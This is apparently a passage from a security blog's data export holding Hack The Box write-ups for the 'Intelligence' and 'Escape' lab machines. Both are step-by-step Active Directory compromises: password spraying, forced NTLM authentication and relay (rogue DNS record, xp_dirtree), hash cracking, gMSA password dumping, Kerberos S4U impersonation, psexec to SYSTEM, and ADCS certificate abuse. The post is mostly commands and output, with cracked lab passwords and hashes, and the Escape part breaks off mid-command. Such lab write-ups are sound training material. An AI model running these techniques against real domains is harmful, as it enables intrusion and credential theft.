-rw-r--r--File Type : PDFFile Type Extension : pdfMIME Type : application/pdfPDF Version : 1.5Linearized : NoPage Count : 1Creator : Scott.ScottLikewise I think all pdfâ€™s may have a new creator so lets extract that from them and put it in a file â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ exiftool *.pdf | grep Creator Creator : Mozilla Firefox 115.6.0Creator : Scott.ScottCreator : Jason.WrightCreator : Veronica.PatelCreator : Jennifer.ThomasCreator : Danny.MatthewsCreator : Stephanie.YoungCreator : Daniel.SheltonCreator : Jose.WilliamsCreator : John.ColemanCreator : Jason.WrightCreator : Jose.WilliamsCreator : Daniel.SheltonCreator : Brian.MorrisCreator : Jennifer.ThomasCreator : Thomas.ValenzuelaCreator : Travis.Evans.....â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ exiftool *.pdf | grep Creator | awk '{ print $3 }' &gt; username.txtNow I have a wordlist of usernames so lets enumerate some values for passwords also in pdfs for that I think I have to look into the content of these pdfs but If I cat these pdfs I will get some junk values so.I have to convert the pdf files into txt file to make the content readable so for that I user a tool called pdftotext Tool. That will convert the pdf files into text files like this â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ for i in $(ls *.pdf);do pdftotext $i;doneI got all the pdf files into .txt files â†’Now lets search for password and I got something also â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ grep -R password -A5 -B52020-06-04-upload.txt-New Account Guide2020-06-04-upload.txt-Welcome to Intelligence Corp!2020-06-04-upload.txt:Please login using your username and the default password of:2020-06-04-upload.txt-NewIntelligenceCorpUser98762020-06-04-upload.txt:After logging in please change your password as soon as possible.2020-06-04-upload.txt-2020-06-04-upload.txt-I got this password from file 2020-06-04-upload.txt .NewIntelligenceCorpUser9876So I have some users and a password so lets brute force a service lets see if any user matches this â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ crackmapexec smb 10.10.10.248 -u username.txt -p 'NewIntelligenceCorpUser9876' --sharesSMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)SMB 10.10.10.248 445 DC [-] intelligence.htb\\Mozilla:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILUREI got one user intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 .I looked inside these shares and I got this â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ smbclient //10.10.10.248/IT -U 'intelligence.htb\\Tiffany.Molina'Password for [INTELLIGENCE.HTB\\Tiffany.Molina]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Apr 19 06:20:55 2021 .. D 0 Mon Apr 19 06:20:55 2021 downdetector.ps1 A 1046 Mon Apr 19 06:20:55 2021\t\t3770367 blocks of size 4096. 1458847 blocks availablesmb: \\&gt; get downdetector.ps1 getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)smb: \\&gt; exit â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ smbclient //10.10.10.248/Users -U 'intelligence.htb\\Tiffany.Molina'Password for [INTELLIGENCE.HTB\\Tiffany.Molina]:Try \"help\" to get a list of possible commands.smb: \\&gt; dir . DR 0 Mon Apr 19 06:50:26 2021 .. DR 0 Mon Apr 19 06:50:26 2021 Administrator D 0 Mon Apr 19 05:48:39 2021 All Users DHSrn 0 Sat Sep 15 12:51:46 2018 Default DHR 0 Mon Apr 19 07:47:40 2021 Default User DHSrn 0 Sat Sep 15 12:51:46 2018 desktop.ini AHS 174 Sat Sep 15 12:41:27 2018 Public DR 0 Mon Apr 19 05:48:39 2021 Ted.Graves D 0 Mon Apr 19 06:50:26 2021 Tiffany.Molina D 0 Mon Apr 19 06:21:46 2021\t\t3770367 blocks of size 4096. 1458847 blocks availablesmb: \\&gt;This file downdetector.ps1 :â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ cat downdetector.ps1 ï¿½ï¿½# Check web server status. Scheduled to run every 5minImport-Module ActiveDirectory foreach($record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\") {try {$request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentialsif(.StatusCode -ne 200) {Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject \"Host: $($record.Name) is down\"}} catch {}}The above code is a PowerShell script designed to check the status of web servers. Hereâ€™s a breakdown of what it does: Import-Module ActiveDirectory: This command imports the Active Directory module, which allows the script to interact with Active Directory objects. foreach($record in Get-ChildItem \"AD:...\"): The script iterates over DNS records in Active Directory that start with â€œwebâ€. try { ... } catch {}: This is a try-catch block used to handle any exceptions that may occur during the execution of the code within the try block. $request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentials: For each record, the script makes a web request to the corresponding URL using the default credentials of the user running the script. if($request.StatusCode -ne 200) { ... }: If the HTTP status code returned is not 200 (OK), indicating that the web server is not responding properly, the script sends an email. Send-MailMessage ...: This command sends an email to â€˜Ted Gravesâ€™ with the subject indicating which host is down.The script is scheduled to run every 5 minutes, as indicated by the comment at the top. Itâ€™s a monitoring script to ensure web servers are functioning correctly and to alert the administrator if any server goes down.Since this script is iterating over a DNS record start with â€œwebâ€ , so I know a Tool that will include a DNS record into this Active directory machine with LDAP.dnstool.py that work on krbrelayx via LDAP.â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ python3 /opt/Tools/krbrelayx/dnstool.py -u intelligence.htb\\\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-Strong --data 10.10.16.29 --type A 10.10.10.248 [-] Connecting to host...[-] Binding to host[+] Bind OK[-] Adding new record[+] LDAP operation completed successfully -u intelligence\\\\Tiffany.MolinaÂ - The user to authenticate as; -p NewIntelligenceCorpUser9876Â - The userâ€™s password; --action addÂ - Adding a new record; --record web-StrongÂ - The domain to add; --data 10.10.16.29Â - The data to add, in this case, the IP to resolve web-Strong to; --type AÂ - The type of record to add.Lets check if my system means Attacker machine is a part of that DNS record or not through nslookup tool â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ nslookup&gt; server intelligence.htbDefault server: intelligence.htbAddress: 10.10.10.248#53&gt; web-StrongServer:\t\tintelligence.htbAddress:\t10.10.10.248#53** server can not find web-Strong: SERVFAILSo It seams we are on the right track so according to downdetector.ps1 script lets capture some data send to Ted Graves user with responder â†’Now I got the TGT ticket so lets crack it with john or hashcat what ever you like I like both so I will be using john here â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=netntlmv2Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusMr.Teddy (Ted.Graves) 1g 0:00:00:09 DONE (2024-01-15 20:35) 0.1092g/s 1181Kp/s 1181Kc/s 1181KC/s Mrz.deltasigma..Mr BOBUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed.intelligence\\Ted.Graves : Mr.TeddyNow you now the password so lets use this password to access some service â†’Only new thing was to have access over IPC$ default share so lets move on to bloodhound now â†’Lets see the shortest path to domain admin â†’Now lets abuse ReadGMSAPassword delegation â†’SVC_INT$@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC_INT$@INTELLIGENCE.HTB.Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.I used gMSADumper â†’â”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools/gMSADumper]â””â”€$ python3 gMSADumper.py -d intelligence.htb -u Ted.Graves -p 'Mr.Teddy' Users or groups who can read password for svc_int$: &gt; DC$ &gt; itsupportsvc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333fsvc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01bI got the svc_int ntlm hash so lets proceed further and now I have AllowedToDelegate Delegation means I can have a silver ticket made so lets create it â†’I will be using getST.py from impackets library from inbuild stored in kali machine so lets Impersonate Administrator here â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ /usr/share/doc/python3-impacket/examples/getST.py -spn www/dc.intelligence.htb -dc-ip 10.10.10.248 -impersonate Administrator intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] CCache file is not found. Skipping...[*] Getting TGT for userKerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) dc-ip 10.10.10.248 - domain controller IP spn www/dc.intelligence.htbÂ - the SPN (Service Principle Name) hashes :5e47bac787e5e1970cf9acdb5b316239Â - the NTLM I collected earlier impersonate administratorÂ - the user I want a ticket for intelligence.htb/svc_intÂ - the account Iâ€™m runningI got this clock skew too great error so to adjust the time of our machine to the victim machine I have to use this tool ntpdate and also If you are running this attacker machine from virtual box you have to stop this service because it takes back 30 seconds.â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ sudo ntpdate 10.10.10.248 2024-01-16 06:46:37.291394 (+0530) +28802.729696 +/- 0.040950 10.10.10.248 s1 no-leapCLOCK: time stepped by 28802.729696â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ sudo service virtualbox-guest-utils stopNow lets again try that service ticket command â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ /usr/share/doc/python3-impacket/examples/getST.py -spn www/dc.intelligence.htb -dc-ip 10.10.10.248 -impersonate Administrator intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating Administrator[*] \tRequesting S4U2self[*] \tRequesting S4U2Proxy[*] Saving ticket in Administrator.ccacheThis time I got the kerbrute ticket in this Administrator.ccache file so lets export it to the variable and access the administrator now with no password â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ export KRB5CCNAME=Administrator.ccacheâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ psexec.py -k -no-pass Administrator@dc.intelligence.htb Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Requesting shares on dc.intelligence.htb.....[*] Found writable share ADMIN$[*] Uploading file VThHSqiz.exe[*] Opening SVCManager on dc.intelligence.htb.....[*] Creating service fTtB on dc.intelligence.htb.....[*] Starting service fTtB.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.1879](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\systemC:\\Windows\\system32&gt; hostnamedcC:\\Windows\\system32&gt; cd C:\\Users\\ADminisitratorThe system cannot find the path specified.C:\\Users\\Administrator&gt; tree /f /aFolder PATH listingVolume serial number is E3EF-EBBDC:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents| \\---WindowsPowerShell| \\---Scripts| \\---InstalledScriptInfos+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator&gt; type Desktop\\root.txt3b69d7328bd6b1ff7700a2ca03a5ac48C:\\Users\\Administrator&gt;I am Domain Admin Now !! If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "Escape", "url": "/posts/Escape/", "categories": "HackTheBox", "tags": "ADCS, Active Directory, Certify, MSSQL, PrivEsc, Rubeus, SMB, mssqlclient.py", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.202 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.202 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 09:00 ISTNmap scan report for 10.10.11.202Host is up (0.097s latency).Not shown: 65516 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-25 11:33:15Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2024-01-25T11:34:49+00:00; +8h00m02s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:57|_ssl-date: 2024-01-25T11:34:49+00:00; +8h00m02s from scanner time.1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ms-sql-info: | 10.10.11.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2024-01-25T11:29:22|_Not valid after: 2054-01-25T11:29:22| ms-sql-ntlm-info: | 10.10.11.202:1433: | Target_Name: sequel| NetBIOS_Domain_Name: sequel| NetBIOS_Computer_Name: DC| DNS_Domain_Name: sequel.htb| DNS_Computer_Name: dc.sequel.htb| DNS_Tree_Name: sequel.htb|_ Product_Version: 10.0.17763|_ssl-date: 2024-01-25T11:34:48+00:00; +8h00m02s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-01-25T11:34:49+00:00; +8h00m01s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:573269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-01-25T11:34:49+00:00; +8h00m02s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel| Not valid before: 2024-01-18T23:03:57|_Not valid after: 2074-01-05T23:03:575985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49681/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049682/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49743/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-01-25T11:34:11|_ start_date: N/A|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s```{: .nolineno}## SMB Enumeration â¤µï¸I started the default random name as user and password as null to see any SMB share exposed â†’![Untitled](Escape/Untitled.png)In this SQL Server Procedures.pdf file I can see some information related to SQL server and a default credential for it â†’![Untitled](Escape/Untitled%201.png)## MS-SQL Enumeration â¤µï¸Since I noticed port 1433 is open for MS-SQL service so there is a tool in impackets called as `mssqlclient.py` . Lets use it here â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL> select @@version; ------------------------------------------------------------------------- Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) \tSep 24 2019 13:48:23 \tCopyright (C) 2019 Microsoft Corporation\tExpress Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor) SQL> select user_name(); ------------------------------------------------------------------------- guest SQL> SELECT name FROM master.dbo.sysdatabases;name ------------------------------------------------------------------------- master tempdb model msdb SQL> ```{: .nolineno}Lets perform NTLM relay attack â†’### **Steal NetNTLM hash / Relay attack :**You should start a **SMB server** to capture the hash used in the authentication (`impacket-smbserver` or `responder` for example).![Untitled](Escape/Untitled%202.png)```powershellxp_dirtree '\\\\\\any\\thing'exec master.dbo.xp_dirtree '\\\\\\any\\thing'EXEC master..xp_subdirs '\\\\\\anything\\'EXEC master..xp_fileexist '\\\\\\anything\\'# Capture hashsudo responder -I tun0sudo impacket-smbserver share ./ -smb2supportmsf> use auxiliary/admin/mssql/mssql_ntlm_stealer```{: .nolineno}Lets crack the hash now â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusREGGIE1234ronnie (sql_svc) 1g 0:00:00:19 DONE (2024-01-25 09:39) 0.05184g/s 554733p/s 554733c/s 554733C/s REINLY..REDMAN69Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed.```{: .nolineno}I got this credentials :```{: .nolineno}sql_svc : REGGIE1234ronnie```{: .nolineno}I checked the services and I have winrm access â†’![Untitled](Escape/Untitled%203.png)### WinRM Session â¤µï¸Lets exnumerate â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' Evil-WinRM shell v3.5 *Evil-WinRM* PS C:\\Users\\sql_svc\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\sql_svc> whoamisequel\\sql_svc*Evil-WinRM* PS C:\\Users\\sql_svc> hostnamedc*Evil-WinRM* PS C:\\Users\\sql_svc> tree /f /aFolder PATH listingVolume serial number is EB33-4140C:.+---Desktop+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\sql_svc>```{: .nolineno}I checked the `SQLServer` Directory in `C:` â†’```powershell*Evil-WinRM* PS C:\\SQLServer> dir Directory: C:\\SQLServerMode LastWriteTime Length Name---- ------------- ------ ----d----- 2/7/2023 8:06 AM Logsd----- 11/18/2022 1:37 PM SQLEXPR_2019-a---- 11/18/2022 1:35 PM 6379936 sqlexpress.exe-a---- 11/18/2022 1:36 PM 268090448 SQLEXPR_x64_ENU.exe*Evil-WinRM* PS C:\\SQLServer> cd Logs*Evil-WinRM* PS C:\\SQLServer\\Logs> dir Directory: C:\\SQLServer\\LogsMode LastWriteTime Length Name---- ------------- ------ -----a---- 2/7/2023 8:06 AM 27608 ERRORLOG.BAK*Evil-WinRM* PS C:\\SQLServer\\Logs> type ERRORLOG.BAK2022-11-18 13:43:05.96 Server Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\tSep 24 2019 13:48:23\tCopyright (C) 2019 Microsoft Corporation\tExpress Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 (Build 17763: ) (Hypervisor)......```{: .nolineno}![Untitled](Escape/Untitled%204.png)I got this mistyped password where he has to put his username so lets try it â†’![Untitled](Escape/Untitled%205.png)```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Ryan.Cooper> whoamisequel\\ryan.cooper*Evil-WinRM* PS C:\\Users\\Ryan.Cooper> hostnamedc*Evil-WinRM* PS C:\\Users\\Ryan.Cooper> tree /f /aFolder PATH listingVolume serial number is EB33-4140C:.+---3D Objects+---Contacts+---Desktop| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Ryan.Cooper>```{: .nolineno}I guess I should look into `ADCS (Active Directory Certificate Authority)` :I have taken the help of [0xdf](https://0xdf.gitlab.io/) for learning ADCS.### Identify ADCSOne thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is usingÂ `netexec`Â (and it works as either sql_svc or Ryan.Cooper):![Untitled](Escape/Untitled%206.png)Lets use the Tool [Certify.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe) to enumerate the ADCS â†’```powershell*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> upload ../../../../../../home/kali/Downloads/Certify.exe Info: Uploading /home/kali/Downloads/HTB/Escape/../../../../../../home/kali/Downloads/Certify.exe to C:\\Users\\Ryan.Cooper\\Documents\\Certify.exe Data: 232104 bytes of 232104 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> .\\Certify.exe cas _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ '__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ 'v1.0.0[*] Action: Find certificate authorities[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'[*] Root CAs Cert SubjectName : CN=sequel-DC-CA, DC=sequel, DC=htb Cert Thumbprint : A263EA89CAFE503BB33513E359747FD262F91A56 Cert Serial : 1EF2FA9A7E6EADAD4F5382F4CE283101 Cert Start Date : 11/18/2022 12:58:46 PM Cert End Date : 11/18/2121 1:08:46 PM Cert Chain : CN=sequel-DC-CA,DC=sequel,DC=htb[*] NTAuthCertificates - Certificates that enable authentication: Cert SubjectName : CN=sequel-DC-CA, DC=sequel, DC=htb Cert Thumbprint : A263EA89CAFE503BB33513E359747FD262F91A56 Cert Serial : 1EF2FA9A7E6EADAD4F5382F4CE283101 Cert Start Date : 11/18/2022 12:58:46 PM Cert End Date : 11/18/2121 1:08:46 PM Cert Chain : CN=sequel-DC-CA,DC=sequel,DC=htb[*] Enterprise/Enrollment CAs: Enterprise CA Name : sequel-DC-CA DNS Hostname : dc.sequel.htb FullName : dc.sequel.htb\\sequel-DC-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED Cert SubjectName : CN=sequel-DC-CA, DC=sequel, DC=htb Cert Thumbprint : A263EA89CAFE503BB33513E359747FD262F91A56 Cert Serial : 1EF2FA9A7E6EADAD4F5382F4CE283101 Cert Start Date : 11/18/2022 12:58:46 PM Cert End Date : 11/18/2121 1:08:46 PM Cert Chain : CN=sequel-DC-CA,DC=sequel,DC=htb UserSpecifiedSAN : Disabled CA Permissions : Owner: BUILTIN\\Administrators S-1-5-32-544 Access Rights Principal Allow Enroll NT AUTHORITY\\Authenticated UsersS-1-5-11 Allow ManageCA, ManageCertificates BUILTIN\\Administrators S-1-5-32-544 Allow ManageCA, ManageCertificates sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 Allow ManageCA, ManageCertificates sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Enrollment Agent Restrictions : None Enabled Certificate Templates: UserAuthentication DirectoryEmailReplication DomainControllerAuthentication KerberosAuthentication EFSRecovery EFS DomainController WebServer Machine User SubCA AdministratorCertify completed in 00:00:26.1459663*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents>```{: .nolineno}Now for finding the vulnerability I used this command :```powershell*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> .\\Certify.exe find /vulnerable _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ '__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ 'v1.0.0[*] Action: Find certificate templates[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'[*] Listing info about the Enterprise CA 'sequel-DC-CA' Enterprise CA Name : sequel-DC-CA DNS Hostname : dc.sequel.htb FullName : dc.sequel.htb\\sequel-DC-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED Cert SubjectName : CN=sequel-DC-CA, DC=sequel, DC=htb Cert Thumbprint : A263EA89CAFE503BB33513E359747FD262F91A56 Cert Serial : 1EF2FA9A7E6EADAD4F5382F4CE283101 Cert Start Date : 11/18/2022 12:58:46 PM Cert End Date : 11/18/2121 1:08:46 PM Cert Chain : CN=sequel-DC-CA,DC=sequel,DC=htb UserSpecifiedSAN : Disabled CA Permissions : Owner: BUILTIN\\Administrators S-1-5-32-544 Access Rights Principal Allow Enroll NT AUTHORITY\\Authenticated UsersS-1-5-11 Allow ManageCA, ManageCertificates BUILTIN\\Administrators S-1-5-32-544 Allow ManageCA, ManageCertificates sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 Allow ManageCA, ManageCertificates sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Enrollment Agent Restrictions : None[!] Vulnerable Certificates Templates : CA Name : dc.sequel.htb\\sequel-DC-CA Template Name : UserAuthentication Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 pkiextendedkeyusage : Client Authentication, Encrypting File System, Secure Email mspki-certificate-application-policy : Client Authentication, Encrypting File System, Secure Email Permissions Enrollment Permissions Enrollment Rights : sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Domain Users S-1-5-21-4078382237-1492182817-2568127209-513 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 Object Control Permissions Owner : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 WriteOwner Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 WriteDacl Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519 WriteProperty Principals : sequel\\Administrator S-1-5-21-4078382237-1492182817-2568127209-500 sequel\\Domain Admins S-1-5-21-4078382237-1492182817-2568127209-512 sequel\\Enterprise Admins S-1-5-21-4078382237-1492182817-2568127209-519Certify completed in 00:00:09.6999614*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents>```{: .nolineno}Since Enrollment Permissions for Domain Users get affected and Template Name UserAuthentication is vulnerable â†’`Certify.exe`Â can request a certificate with an alternative name of administrator. It returns aÂ `cert.pem`:```powershellCertify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator```{: .nolineno}```powershell*Evil-WinRM* 